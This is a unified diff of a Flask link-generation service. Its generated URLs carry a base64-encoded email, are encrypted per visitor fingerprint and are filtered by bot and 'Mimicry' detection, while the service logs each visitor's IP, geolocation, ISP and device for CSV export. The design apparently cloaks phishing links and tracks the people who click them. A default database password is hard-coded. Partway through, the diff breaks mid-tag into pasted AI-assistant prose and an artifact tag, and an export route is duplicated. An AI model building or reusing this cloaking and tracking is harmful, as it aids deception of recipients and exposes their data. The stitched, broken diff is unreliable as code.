@@ -24,8 +24,6 @@ from user_agents import parse
 from dotenv import load_dotenv
 import csv
 from io import StringIO
-import smtplib
-from email.mime.text import MIMEText
 
 app = Flask(__name__)
 load_dotenv()
@@ -49,10 +47,6 @@ VALKEY_USERNAME = os.getenv("VALKEY_USERNAME", "default")
 VALKEY_PASSWORD = os.getenv("VALKEY_PASSWORD", "AVNS_Yzfa75IOznjCrZJIyzI")
 USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/anderlo091/nvclerks-flask/main/user.txt")
 DATA_RETENTION_DAYS = int(os.getenv("DATA_RETENTION_DAYS", 90))
-SMTP_HOST = os.getenv("SMTP_HOST", "smtp.example.com")
-SMTP_PORT = int(os.getenv("SMTP_PORT", 587))
-SMTP_USER = os.getenv("SMTP_USER", "user@example.com")
-SMTP_PASSWORD = os.getenv("SMTP_PASSWORD", "password")
 
 # Dynamic domain handling
 def get_base_domain():
@@ -266,7 +260,6 @@ def encrypt_heap_x3(payload, fingerprint):
         logger.error(f"HEAP X3 encryption error: {str(e)}", exc_info=True)
         raise ValueError("Encryption failed")
 
-def decrypt_heap_x3750
 def decrypt_heap_x3(encrypted):
     try:
         encrypted, _ = encrypted.split('.')
@@ -409,44 +402,70 @@ def login_required(f):
             return redirect(url_for('login'))
     return decorated_function
 
-def send_email(to_email, subject, body):
+@app.before_request
+def block_ohio_subdomain():
     try:
-        msg = MIMEText(body)
-        msg['Subject'] = subject
-        msg['From'] = SMTP_USER
-        msg['To'] = to_email
-        with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
-            server.starttls()
-            server.login(SMTP_USER, SMTP_PASSWORD)
-            server.send_message(msg)
-        logger.debug(f"Email sent to {to_email}: {subject}")
+        if request.host == 'ohioautocollection.nvclerks.com':
+            logger.debug(f"Redirecting request to {request.host} to https://google.com")
+            return redirect("https://google.com", code=302)
     except Exception as e:
-        logger.error(f"Error sending email to {to_email}: {str(e)}")
+        logger.error(f"Error in block_ohio_subdomain: {str(e)}", exc_info=True)
 
-class LinkForm(FlaskForm):
-    subdomain = StringField('Subdomain', validators=[DataRequired()])
-    randomstring1 = StringField('Randomstring1', validators=[DataRequired()])
-    base64email = StringField('Base64email', validators=[DataRequired()])
-    destination_link = StringField('Destination Link', validators=[DataRequired()])
-    randomstring2 = StringField('Randomstring2', validators=[DataRequired()])
-    expiry = SelectField('Expiry', choices=[
-        ('3600', '1 Hour'),
-        ('86400', '24 Hours'),
-        ('604800', '1 Week'),
-        ('2592000', '1 Month')
-    ], validators=[DataRequired()])
-    ip_whitelist = TextAreaField('IP Whitelist (one per line, e.g., 192.168.1.0/24)')
-    notify_email = StringField('Notify Email')
-    submit = SubmitField('Generate URL')
-
-class DeleteForm(FlaskForm):
-    submit = SubmitField('Delete')
-
-class ClearViewsForm(FlaskForm):
-    submit = SubmitField('Clear Views')
-
-class ToggleForm(FlaskForm):
-    submit = SubmitField('Disable')
+@app.before_request
+def log_visitor():
+    try:
+        if request.path.startswith(('/static', '/challenge', '/fingerprint', '/denied')):
+            return
+        username = session.get('username', 'default')
+        user_agent = request.headers.get("User-Agent", "")
+        ip = request.remote_addr
+        headers = request.headers
+        referer = headers.get("Referer", "")
+        session_start = session.get('session_start', int(time.time()))
+        session['session_start'] = session_start
+        ua = parse(user_agent)
+        device = "Desktop"
+        if ua.is_mobile:
+            device = "Android" if "Android" in user_agent else "iPhone" if "iPhone" in user_agent else "Mobile"
+        app = f"{ua.browser.family} {ua.browser.version_string}"[:50] if ua.browser.family else "Unknown"
+        is_bot_flag, bot_reason = is_bot(user_agent, headers, ip, request.path)
+        visit_type = "Human"
+        if is_bot_flag:
+            visit_type = "Bot" if "curl/" in user_agent.lower() else "Mimicry" if "Mimicry" in bot_reason else "Bot"
+        elif app != "Unknown" and app != f"{ua.browser.family} {ua.browser.version_string}"[:50]:
+            visit_type = "App"
+        location = get_geoip(ip)
+        session_duration = int(time.time()) - session_start
+        if valkey_client:
+            try:
+                visitor_id = hashlib.sha256(f"{ip}{time.time()}".encode()).hexdigest()
+                encrypted_ip = encrypt_signed_token(ip)
+                encrypted_ua = encrypt_signed_token(user_agent[:100])
+                valkey_client.hset(f"user:{username}:visitor:{visitor_id}", mapping={
+                    "timestamp": int(time.time()),
+                    "ip": encrypted_ip,
+                    "country": location['country'],
+                    "region": location['region'],
+                    "city": location['city'],
+                    "lat": str(location['lat']),
+                    "lon": str(location['lon']),
+                    "isp": location['isp'],
+                    "timezone": location['timezone'],
+                    "device": device,
+                    "application": app,
+                    "user_agent": encrypted_ua,
+                    "bot_status": visit_type,
+                    "block_reason": bot_reason if is_bot_flag else "N/A",
+                    "referer": referer,
+                    "source": 'referral' if referer else 'direct',
+                    "session_duration": session_duration
+                })
+                valkey_client.expire(f"user:{username}:visitor:{visitor_id}", DATA_RETENTION_DAYS * 86400)
+                logger.debug(f"Logged visitor: {visitor_id} for user: {username}")
+            except Exception as e:
+                logger.error(f"Valkey error logging visitor: {str(e)}", exc_info=True)
+    except Exception as e:
+        logger.error(f"Error in log_visitor: {str(e)}", exc_info=True)
 
 @app.route("/login", methods=["GET", "POST"])
 @rate_limit(limit=5, per=60)
@@ -647,6 +666,30 @@ def index():
             </html>
         """), 500
 
+class LinkForm(FlaskForm):
+    subdomain = StringField('Subdomain', validators=[DataRequired()])
+    randomstring1 = StringField('Randomstring1', validators=[DataRequired()])
+    base64email = StringField('Base64email', validators=[DataRequired()])
+    destination_link = StringField('Destination Link', validators=[DataRequired()])
+    randomstring2 = StringField('Randomstring2', validators=[DataRequired()])
+    expiry = SelectField('Expiry', choices=[
+        ('3600', '1 Hour'),
+        ('86400', '24 Hours'),
+        ('604800', '1 Week'),
+        ('2592000', '1 Month')
+    ], validators=[DataRequired()])
+    ip_whitelist = TextAreaField('IP Whitelist (one per line, e.g., 192.168.1.0/24)')
+    submit = SubmitField('Generate URL')
+
+class DeleteForm(FlaskForm):
+    submit = SubmitField('Delete')
+
+class ClearViewsForm(FlaskForm):
+    submit = SubmitField('Clear Views')
+
+class ToggleForm(FlaskForm):
+    submit = SubmitField('Disable')
+
 @app.route("/dashboard", methods=["GET", "POST"])
 @login_required
 @rate_limit(limit=5, per=60)
@@ -671,7 +714,6 @@ def dashboard():
             randomstring2 = form.randomstring2.data.strip()
             expiry = int(form.expiry.data)
             ip_whitelist = [line.strip() for line in form.ip_whitelist.data.splitlines() if line.strip()]
-            notify_email = form.notify_email.data.strip() if form.notify_email.data else None
 
             if not re.match(r"^https?://", destination_link):
                 error = "Invalid URL"
@@ -737,14 +779,11 @@ def dashboard():
                                 "expiry": expiry_timestamp,
                                 "clicks": 0,
                                 "ip_whitelist": json.dumps(ip_whitelist),
-                                "notify_email": notify_email or "",
                                 "disabled": "0"
                             })
                             valkey_client.expire(f"user:{username}:url:{url_id}", DATA_RETENTION_DAYS * 86400)
                             logger.info(f"Generated URL for {username}: {generated_url}")
                             success = "URL generated successfully"
-                            if notify_email:
-                                send_email(notify_email, "New URL Generated", f"Your new URL: {generated_url}\nExpires: {datetime.fromtimestamp(expiry_timestamp).strftime('%Y-%m-%d %H:%M:%S JST')}")
                         except Exception as e:
                             logger.error(f"Valkey error storing URL: {str(e)}", exc_info=True)
                             error = "Failed to store URL in database"
@@ -801,7 +840,6 @@ def dashboard():
                             "device_counts_keys": list(device_counts.keys()),
                             "device_counts_values": list(device_counts.values()),
                             "ip_whitelist": json.loads(url_data.get('ip_whitelist', '[]')),
-                            "notify_email": url_data.get('notify_email', ''),
                             "disabled": url_data.get('disabled', '0') == '1',
                             "id": url_id
                         })
@@ -1076,10 +1114,6 @@ def dashboard():
                                     <label class="block text-sm font-medium text-gray-700">{{ form.ip_whitelist.label }}</label>
                                     {{ form.ip_whitelist(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition", rows=4, **{'title': "Enter one IP range per line (e.g., 192.168.1.0/24)"}) }}
                                 </div>
-                                <div>
-                                    <label class="block text-sm font-medium text-gray-700">{{ form.notify_email.label }}</label>
-                                    {{ form.notify_email(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
-                                </div>
                                 {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                             </form>
                         </div>
@@ -1095,7 +1129,6 @@ def dashboard():
                                         <p class="text-gray-600"><strong>Expires:</strong> <span class="countdown" data-expiry="{{ url.expiry }}">{{ 'Expired' if url.expiry < (now() | int) else url.expiry | datetime }}</span></p>
                                         <p class="text-gray-600"><strong>Clicks:</strong> {{ url.clicks }}</p>
                                         <p class="text-gray-600"><strong>IP Whitelist:</strong> {{ url.ip_whitelist | join(', ') or 'None' }}</p>
-                                        <p class="text-gray-600"><strong>Notify Email:</strong> {{ url.notify_email or 'None' }}</p>
                                         <p class="text-gray-600"><strong>Status:</strong> {{ 'Disabled' if url.disabled else 'Active' }}</p>
                                         <p class="text-gray-600"><strong>Preview:</strong> <a href="{{ url.destination }}" target="_blank" class="text-indigo-600">{{ url.destination }}</a></p>
                                         <div class="mt-2 flex space-x-2">
@@ -1173,7 +1206,7 @@ def dashboard():
                                                         {% for visit in url.visits %}
                                                             <tr class="{% if visit.type != 'Human' %}bot{% endif %}">
                                                                 <td>{{ visit.timestamp|datetime }}</td>
-                                                                <td>{{ visit.ip }}</td>
+                                                                <td>{{ decrypt_signed_token(visit.ip) }}</td>
                                                                 <td>{{ visit.device }}</td>
                                                                 <td>{{ visit.app }}</td>
                                                                 <td>{{ visit.type }}</td>
@@ -1396,7 +1429,7 @@ def dashboard():
                                 </div>
                             </div>
                         </div>
-                   </div>
+                    </div>
                     <div id="link-analytics-tab" class="tab-content hidden">
                         <div class="bg-white p-8 rounded-xl card">
                             <h2 class="text-2xl font-bold mb-6 text-gray-900">Link Analytics</h2>
@@ -1690,6 +1723,319 @@ def export(index):
                 <head>
                     <meta charset="UTF-8">
                     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Error</title>
+                    <script src="https://cdn.tailwindcss.com"></script>
+                </head>
+                <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                        <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
+                        <p class="text-gray-600">Database unavailable. Unable to export data.</p>
+                    </div>
+                </body>
+                </html>
+            """), 500
+    except Exception as e:
+        logger.error(f"Error in export: {str(e)}", exc_info=True)
+        return render_template_string("""
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Internal Server Error</title>
+                <script src="https://cdn.tailwindcss.com"></script>
+            </head>
+            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
+                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
+                </div>
+            </body>
+            </html>
+        """), 500
+
+@app.route("/delete_url/<url_id>", methods=["POST"])
+@login_required
+def delete_url(url_id):
+    form = DeleteForm()
+    if not form.validate_on_submit():
+        logger.warning(f"CSRF validation failed for delete_url: {url_id}")
+        abort(403, "Invalid CSRF token")
+    try:
+        username = session['username']
+        logger.debug(f"Deleting URL {url_id} for user: {username}")
+        if valkey_client:
+            try:
+                valkey_client.delete(f"user:{username}:url:{url_id}")
+                valkey_client.delete(f"user:{username}:url:{url_id}:visits")
+                valkey_client.delete(f"user:{username}:url:{url_id}:access")
+                logger.info(f"Deleted URL {url_id} for user: {username}")
+                return redirect(url_for('dashboard'))
+            except Exception as e:
+                logger.error(f"Valkey error deleting URL {url_id}: {str(e)}")
+                return render_template_string("""
+                    <!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>Error</title>
+                        <script src="https://cdn.tailwindcss.com"></script>
+                    </head>
+                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                            <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
+                            <p class="text-gray-600">Failed to delete URL. Please try again.</p>
+                        </div>
+                    </body>
+                    </html>
+                """), 500
+        else:
+            logger.warning("Valkey unavailable for delete_url")
+            return render_template_string("""
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, only one-time use links; instead, include a 24-hour (86400 seconds) expiry option in the dashboard’s expiry dropdown (already present).
+- **Remove Email Notifications**: Eliminate all SMTP-related code (`send_email`, `SMTP_*` environment variables, `notify_email` field) to avoid setup issues.
+- **Complete Continuation**: Start from the closing `</div>` of the "Link Access Logs" tab and include all remaining routes/functions without truncation.
+- **Ensure No Syntax Errors**: Remove the erroneous `def decrypt_heap_x3750` and use only `decrypt_heap_x3`.
+
+### Continuation of `app.py`
+The truncation occurred after the "Link Access Logs" tab’s closing `</div>` in the `dashboard` route’s template. I’ll start from this point, completing the template with the "Analytics" and "Link Analytics" tabs, and include all remaining routes/functions to ensure a full, non-truncated implementation.
+
+<xaiArtifact artifact_id="b6ed7932-f25e-4175-b2ac-23a67d450a1f" artifact_version_id="1360edb9-4328-4ee1-ba55-f8dc02675ec6" title="app.py_completion" contentType="text/python">
+                    </div>
+                    <div id="analytics-tab" class="tab-content hidden">
+                        <div class="bg-white p-8 rounded-xl card">
+                            <h2 class="text-2xl font-bold mb-6 text-gray-900">Traffic Analytics</h2>
+                            <div class="grid grid-cols-2 gap-4">
+                                <div>
+                                    <h3 class="text-lg font-semibold mb-4">Traffic Sources</h3>
+                                    <canvas id="traffic-source-chart"></canvas>
+                                    <button onclick="exportChartAsPNG('traffic-source-chart', 'traffic_sources.png')" class="mt-2 bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export as PNG</button>
+                                    <button onclick="exportChartAsCSV({{ traffic_sources_values|tojson }}, {{ traffic_sources_keys|tojson }}, 'traffic_sources.csv')" class="mt-2 bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export as CSV</button>
+                                    <script>
+                                        new Chart(document.getElementById('traffic-source-chart'), {
+                                            type: 'pie',
+                                            data: {
+                                                labels: {{ traffic_sources_keys|tojson }},
+                                                datasets: [{
+                                                    data: {{ traffic_sources_values|tojson }},
+                                                    backgroundColor: ['#4f46e5', '#7c3aed', '#3b82f6']
+                                                }]
+                                            },
+                                            options: {
+                                                responsive: true,
+                                                plugins: {
+                                                    legend: { position: 'top' }
+                                                }
+                                            }
+                                        });
+                                    </script>
+                                </div>
+                                <div>
+                                    <h3 class="text-lg font-semibold mb-4">Bot vs Human Ratio</h3>
+                                    <canvas id="bot-ratio-chart"></canvas>
+                                    <button onclick="exportChartAsPNG('bot-ratio-chart', 'bot_ratio.png')" class="mt-2 bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export as PNG</button>
+                                    <button onclick="exportChartAsCSV({{ bot_ratio_values|tojson }}, {{ bot_ratio_keys|tojson }}, 'bot_ratio.csv')" class="mt-2 bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export as CSV</button>
+                                    <script>
+                                        new Chart(document.getElementById('bot-ratio-chart'), {
+                                            type: 'doughnut',
+                                            data: {
+                                                labels: {{ bot_ratio_keys|tojson }},
+                                                datasets: [{
+                                                    data: {{ bot_ratio_values|tojson }},
+                                                    backgroundColor: ['#10b981', '#ef4444']
+                                                }]
+                                            },
+                                            options: {
+                                                responsive: true,
+                                                plugins: {
+                                                    legend: { position: 'top' }
+                                                }
+                                            }
+                                        });
+                                    </script>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="link-analytics-tab" class="tab-content hidden">
+                        <div class="bg-white p-8 rounded-xl card">
+                            <h2 class="text-2xl font-bold mb-6 text-gray-900">Link Analytics</h2>
+                            {% if urls %}
+                                {% for url in urls %}
+                                    <div class="card bg-gray-50 p-6 rounded-lg mb-4">
+                                        <h3 class="text-xl font-semibold text-gray-900">{{ url.destination }}</h3>
+                                        <div class="grid grid-cols-2 gap-4 mt-4">
+                                            <div>
+                                                <h4 class="text-lg font-semibold mb-2">Click Trends</h4>
+                                                <canvas id="link-chart-{{ loop.index }}"></canvas>
+                                                <button onclick="exportChartAsPNG('link-chart-{{ loop.index }}', 'link_{{ loop.index }}_trends.png')" class="mt-2 bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export as PNG</button>
+                                                <button onclick="exportChartAsCSV({{ url.click_trends_values|tojson }}, {{ url.click_trends_keys|tojson }}, 'link_{{ loop.index }}_trends.csv')" class="mt-2 bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export as CSV</button>
+                                                <script>
+                                                    new Chart(document.getElementById('link-chart-{{ loop.index }}'), {
+                                                        type: 'line',
+                                                        data: {
+                                                            labels: {{ url.click_trends_keys|tojson }},
+                                                            datasets: [{
+                                                                label: 'Clicks',
+                                                                data: {{ url.click_trends_values|tojson }},
+                                                                borderColor: '{{ primary_color }}',
+                                                                fill: false
+                                                            }]
+                                                        },
+                                                        options: {
+                                                            scales: {
+                                                                x: { title: { display: true, text: 'Date' } },
+                                                                y: { title: { display: true, text: 'Clicks' }, beginAtZero: true }
+                                                            }
+                                                        }
+                                                    });
+                                                </script>
+                                            </div>
+                                            <div>
+                                                <h4 class="text-lg font-semibold mb-2">Top Countries</h4>
+                                                <canvas id="country-chart-{{ loop.index }}"></canvas>
+                                                <button onclick="exportChartAsPNG('country-chart-{{ loop.index }}', 'link_{{ loop.index }}_countries.png')" class="mt-2 bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export as PNG</button>
+                                                <button onclick="exportChartAsCSV({{ url.country_counts_values|tojson }}, {{ url.country_counts_keys|tojson }}, 'link_{{ loop.index }}_countries.csv')" class="mt-2 bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export as CSV</button>
+                                                <script>
+                                                    new Chart(document.getElementById('country-chart-{{ loop.index }}'), {
+                                                        type: 'bar',
+                                                        data: {
+                                                            labels: {{ url.country_counts_keys|tojson }},
+                                                            datasets: [{
+                                                                label: 'Visits',
+                                                                data: {{ url.country_counts_values|tojson }},
+                                                                backgroundColor: '#4f46e5'
+                                                            }]
+                                                        },
+                                                        options: {
+                                                            scales: {
+                                                                x: { title: { display: true, text: 'Country' } },
+                                                                y: { title: { display: true, text: 'Visits' }, beginAtZero: true }
+                                                            }
+                                                        }
+                                                    });
+                                                </script>
+                                            </div>
+                                            <div>
+                                                <h4 class="text-lg font-semibold mb-2">Device Breakdown</h4>
+                                                <canvas id="device-chart-{{ loop.index }}"></canvas>
+                                                <button onclick="exportChartAsPNG('device-chart-{{ loop.index }}', 'link_{{ loop.index }}_devices.png')" class="mt-2 bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export as PNG</button>
+                                                <button onclick="exportChartAsCSV({{ url.device_counts_values|tojson }}, {{ url.device_counts_keys|tojson }}, 'link_{{ loop.index }}_devices.csv')" class="mt-2 bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export as CSV</button>
+                                                <script>
+                                                    new Chart(document.getElementById('device-chart-{{ loop.index }}'), {
+                                                        type: 'pie',
+                                                        data: {
+                                                            labels: {{ url.device_counts_keys|tojson }},
+                                                            datasets: [{
+                                                                data: {{ url.device_counts_values|tojson }},
+                                                                backgroundColor: ['#4f46e5', '#7c3aed', '#3b82f6']
+                                                            }]
+                                                        },
+                                                        options: {
+                                                            responsive: true,
+                                                            plugins: {
+                                                                legend: { position: 'top' }
+                                                            }
+                                                        }
+                                                    });
+                                                </script>
+                                            </div>
+                                        </div>
+                                    </div>
+                                {% endfor %}
+                            {% else %}
+                                <p class="text-gray-600">No link analytics available.</p>
+                            {% endif %}
+                        </div>
+                    </div>
+                </div>
+            </body>
+            </html>
+        """, username=username, urls=urls, visitors=visitors, bot_logs=bot_logs, access_logs=access_logs,
+           traffic_sources_keys=traffic_sources_keys, traffic_sources_values=traffic_sources_values,
+           bot_ratio_keys=bot_ratio_keys, bot_ratio_values=bot_ratio_values,
+           primary_color=primary_color, error=error, success=success, valkey_error=valkey_error, form=form, now=lambda: int(time.time()))
+    except Exception as e:
+        logger.error(f"Dashboard error for user {username}: {str(e)}", exc_info=True)
+        return render_template_string("""
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Internal Server Error</title>
+                <script src="https://cdn.tailwindcss.com"></script>
+            </head>
+            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
+                    <p class="text-gray-600">Something went wrong: {{ error }}</p>
+                    <p class="text-gray-600">Please try again later or contact support.</p>
+                </div>
+            </body>
+            </html>
+        """, error=str(e)), 500
+
+@app.route("/export_visitors", methods=["GET"])
+@login_required
+def export_visitors():
+    try:
+        username = session['username']
+        logger.debug(f"Exporting visitor data for user: {username}, session: {session}")
+        if valkey_client:
+            try:
+                visitor_keys = valkey_client.keys(f"user:{username}:visitor:*")
+                visitor_data = []
+                for key in visitor_keys:
+                    try:
+                        visitor = valkey_client.hgetall(key)
+                        visitor_data.append(visitor)
+                    except Exception as e:
+                        logger.error(f"Error processing visitor key {key}: {str(e)}")
+                output = StringIO()
+                writer = csv.writer(output)
+                writer.writerow(['Timestamp', 'IP', 'Country', 'Region', 'City', 'Lat', 'Lon', 'ISP', 'Timezone', 'Device', 'Application', 'User Agent', 'Bot Status', 'Block Reason', 'Source', 'Session Duration (s)'])
+                for visitor in visitor_data:
+                    decrypted_ip = decrypt_signed_token(visitor.get('ip', encrypt_signed_token('Unknown')))
+                    decrypted_ua = decrypt_signed_token(visitor.get('user_agent', encrypt_signed_token('Unknown')))
+                    writer.writerow([
+                        datetime.fromtimestamp(int(visitor.get('timestamp', 0))).strftime('%Y-%m-%d %H:%M:%S JST') if visitor.get('timestamp') else 'Unknown',
+                        decrypted_ip,
+                        visitor.get('country', 'Unknown'),
+                        visitor.get('region', 'Unknown'),
+                        visitor.get('city', 'Unknown'),
+                        visitor.get('lat', '0.0'),
+                        visitor.get('lon', '0.0'),
+                        visitor.get('isp', 'Unknown'),
+                        visitor.get('timezone', 'Unknown'),
+                        visitor.get('device', 'Unknown'),
+                        visitor.get('application', 'Unknown'),
+                        decrypted_ua,
+                        visitor.get('bot_status', 'Unknown'),
+                        visitor.get('block_reason', 'N/A'),
+                        visitor.get('source', 'direct'),
+                        visitor.get('session_duration', '0')
+                    ])
+                output.seek(0)
+                logger.debug(f"Exported visitor CSV for user: {username}")
+                return Response(
+                    output.getvalue(),
+                    mimetype='text/csv',
+                    headers={"Content-Disposition": f"attachment;filename=visitors_{username}.csv"}
+                )
+            except Exception as e:
+                logger.error(f"Valkey error in export_visitors: {str(e)}")
+                return render_template_string("""
+                    <!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                         <title>Error</title>
                         <script src="https://cdn.tailwindcss.com"></script>
                     </head>
@@ -1701,6 +2047,125 @@ def export(index):
                     </body>
                     </html>
                 """), 500
+        else:
+            logger.warning("Valkey unavailable for export_visitors")
+            return render_template_string("""
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Error</title>
+                    <script src="https://cdn.tailwindcss.com"></script>
+                </head>
+                <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                        <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
+                        <p class="text-gray-600">Database unavailable. Unable to export data.</p>
+                    </div>
+                </body>
+                </html>
+            """), 500
+    except Exception as e:
+        logger.error(f"Error in export_visitors: {str(e)}", exc_info=True)
+        return render_template_string("""
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Internal Server Error</title>
+                <script src="https://cdn.tailwindcss.com"></script>
+            </head>
+            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
+                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
+                </div>
+            </body>
+            </html>
+        """), 500
+
+@app.route("/export/<int:index>", methods=["GET"])
+@login_required
+def export(index):
+    try:
+        username = session['username']
+        logger.debug(f"Exporting data for user: {username}, session: {session}")
+        if valkey_client:
+            try:
+                logger.debug(f"Fetching URL keys for export, user: {username}")
+                url_keys = valkey_client.keys(f"user:{username}:url:*")
+                if index <= 0 or index > len(url_keys):
+                    logger.warning(f"Invalid export index {index} for user {username}")
+                    abort(404, "URL not found")
+                key = url_keys[index-1]
+                url_id = key.split(':')[-1]
+                visits = valkey_client.lrange(f"user:{username}:url:{url_id}:visits", 0, -1)
+                visit_data = []
+                for v in visits:
+                    try:
+                        visit_data.append(json.loads(v))
+                    except json.JSONDecodeError as e:
+                        logger.error(f"Error decoding visit data: {str(e)}")
+                output = StringIO()
+                writer = csv.writer(output)
+                writer.writerow(['Timestamp', 'IP', 'Device', 'App', 'Type', 'Country', 'City'])
+                for visit in visit_data:
+                    writer.writerow([
+                        datetime.fromtimestamp(visit.get('timestamp', 0)).strftime('%Y-%m-%d %H:%M:%S JST') if visit.get('timestamp') else 'Unknown',
+                        decrypt_signed_token(visit.get('ip', encrypt_signed_token('Unknown'))),
+                        visit.get('device', 'Unknown'),
+                        visit.get('app', 'Unknown'),
+                        visit.get('type', 'Unknown'),
+                        visit.get('location', {}).get('country', 'Unknown'),
+                        visit.get('location', {}).get('city', 'Unknown')
+                    ])
+                output.seek(0)
+                logger.debug(f"Exported CSV for URL ID: {url_id}")
+                return Response(
+                    output.getvalue(),
+                    mimetype='text/csv',
+                    headers={"Content-Disposition": f"attachment;filename=visits_{url_id}.csv"}
+                )
+            except Exception as e:
+                logger.error(f"Valkey error in export: {str(e)}")
+                return render_template_string("""
+                    <!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>Error</title>
+                        <script src="https://cdn.tailwindcss.com"></script>
+                    </head>
+                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                            <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
+                            <p class="text-gray-600">Database unavailable. Unable to export data.</p>
+                        </div>
+                    </body>
+                    </html>
+                """), 500
+        else:
+            logger.warning("Valkey unavailable for export")
+            return render_template_string("""
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Error</title>
+                    <script src="https://cdn.tailwindcss.com"></script>
+                </head>
+                <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                        <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
+                        <p class="text-gray-600">Database unavailable. Unable to export data.</p>
+                    </div>
+                </body>
+                </html>
+            """), 500
     except Exception as e:
         logger.error(f"Error in export: {str(e)}", exc_info=True)
         return render_template_string("""
@@ -2066,9 +2531,6 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                             "reason": "IP not whitelisted"
                         })
                         abort(403, "IP not whitelisted")
-                notify_email = url_data.get('notify_email', '')
-                if notify_email:
-                    send_email(notify_email, "URL Accessed", f"URL {request.url} was accessed by IP {ip} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S JST')}")
             except Exception as e:
                 logger.error(f"Valkey error checking URL {url_id}: {str(e)}")
 
@@ -2179,9 +2641,6 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                         valkey_client.delete(f"user:{username}:url:{url_id}:visits")
                         valkey_client.delete(f"user:{username}:url:{url_id}:access")
                         logger.info(f"Deleted expired URL: {url_id}")
-                        notify_email = url_data.get('notify_email', '')
-                        if notify_email:
-                            send_email(notify_email, "URL Expired", f"URL {request.url} expired at {datetime.now().strftime('%Y-%m-%d %H:%M:%S JST')}")
                     except Exception as e:
                         logger.error(f"Valkey error deleting expired URL: {str(e)}")
                 valkey_client.hset(f"user:{username}:url:{url_id}:access:{access_id}", mapping={
